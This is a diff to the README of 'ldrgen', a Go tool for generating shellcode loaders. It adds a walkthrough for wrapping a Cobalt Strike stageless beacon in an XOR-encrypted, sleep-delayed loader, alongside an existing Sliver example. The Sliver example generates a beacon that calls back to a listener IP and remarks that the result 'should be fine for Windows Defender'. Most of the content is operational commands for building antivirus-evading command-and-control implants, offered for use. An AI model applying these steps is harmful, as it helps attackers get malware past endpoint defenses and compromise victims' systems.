@@ -7,8 +7,8 @@ ldrgen is a golang cli tool for rapid generation of shellcode loaders using pre-
   - [Table of Contents](#table-of-contents)
   - [Why?](#why)
   - [Usage](#usage)
-  - [Example (calc.exe)](#example-calcexe)
-  - [Example (sliver beacon)](#example-sliver-beacon)
+  - [Example (Calc Shellcode)](#example-calc-shellcode)
+  - [Example (Sliver Beacon)](#example-sliver-beacon)
     - [Sliver Shellcode Generation](#sliver-shellcode-generation)
     - [Loader Generation](#loader-generation)
     - [Compilation](#compilation)
@@ -39,15 +39,15 @@ This operation creates a temporary file "shellcode.bin.enc" in your current work
 
 Make sure to specify a loader token that supports encryption, some are: `inline_xor`, `createthread_xor`, `createthread_xor_sleep`.
 
-## Example (calc.exe)
+## Example (Calc Shellcode)
 ```bash
 ./ldr -bin ./dev/calc_shellcode/calc.bin -out ./output -ldr CreateThread_Xor -enc xor -args "key=secretKey123" 
 cd output && make x64
 ```
 
-## Example (sliver beacon)
+## Example (Sliver Beacon)
 
-### Sliver Shellcode Generation
+### Shellcode Generation
 ```bash
 sliver > generate beacon --http <listener_ip> --format shellcode
 ```
@@ -92,6 +92,30 @@ This should be fine for Windows Defender.
 ![sliver_callback](./assets/207cde0dd0375bfa437d937ca7414e2b.png)
 ![sliver_rubeus](./assets/619e6ee387d2bfe44f4927f8f53054a1.png)
 
+## Example (Cobalt Strike Beacon)
+This is pretty much the same as the Sliver example. Though, you might need more evasive techniques as Cobalt Strike is more sigged.
+
+### Shellcode Generation
+- Payloads -> Stageless Payload Generator -> Output: Raw -> Generate
+
+![cs_shellcode_gen](./assets/50cbb61b408acdee568dc742b14b9acf.png)
+
+### Loader Generation
+```bash
+./ldr -bin payload_x64.bin -out ./output -ldr CreateThread_Iat_Xor_Sleep -enc xor -args "key=asdasdiasdasidasdasd, sleep=10" --cleanup
+```
+![ldr_gen_4](./assets/6c61bce844ca5d2147fd9d0ec2e61dff.png)
+
+### Compilation
+```bash
+cd output && make x64
+```
+![compiled](./assets/22ef4688201192dcbb2bcd8e38727aa9.png)
+
+### Beacon
+![callback](./assets/2de26d2ef3135b1458d3cb60139b0136.png)
+
+remove the print statements from source if you care, but in cases where you _should_ care, you should probably be handwriting your loaders.
 ## Customization
 
 ### Loader Tokens
